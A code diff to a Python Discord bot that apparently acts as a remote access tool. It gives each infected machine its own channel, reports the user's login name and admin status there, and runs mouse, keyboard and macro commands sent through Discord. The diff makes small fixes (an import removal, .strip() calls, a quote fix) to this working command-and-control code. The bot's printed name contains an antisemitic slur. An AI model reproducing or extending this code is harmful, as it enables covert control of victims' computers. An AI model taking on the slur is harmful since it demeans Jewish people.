@@ -1,4 +1,3 @@
-from PIL import ImageGrab, ImageDraw
 from discord.ext import commands
 from threading import Thread
 from pynput import keyboard
@@ -171,7 +170,7 @@ async def f_parse_internal(command, ctx):
             x = int(f_evaluate_expression_internal(parts[1]))
             y = int(f_evaluate_expression_internal(parts[2]))
             pyautogui.moveTo(x, y)
-
+        
         elif cmd == "key":
             key = f_resolve_expression_internal(parts[1].lower())
             action = parts[2].lower() if len(parts) > 2 else "press"
@@ -329,11 +328,11 @@ async def macro(ctx, *, command: str = None):
         if attachment.filename.lower().endswith(".pymacro"):
             file_bytes = await attachment.read()
             script_content = file_bytes.decode("utf-8")
-            await i_macro(script_content, ctx)
+            await i_macro(script_content.strip(), ctx)
             return
         
     elif command != None:
-        await i_macro(command, ctx)
+        await i_macro(command.strip(), ctx)
         return
         
     await ctx.send("No .pymacro file attached!")
@@ -413,10 +412,10 @@ async def on_ready():
             }
             new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
             await new_channel.edit(topic=logon_date)
-            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ""}")
+            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
         else:
             await existing_channel.edit(topic=logon_date)
-            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ""}")
+            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
         in_server_ammount += 1
             
     print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')
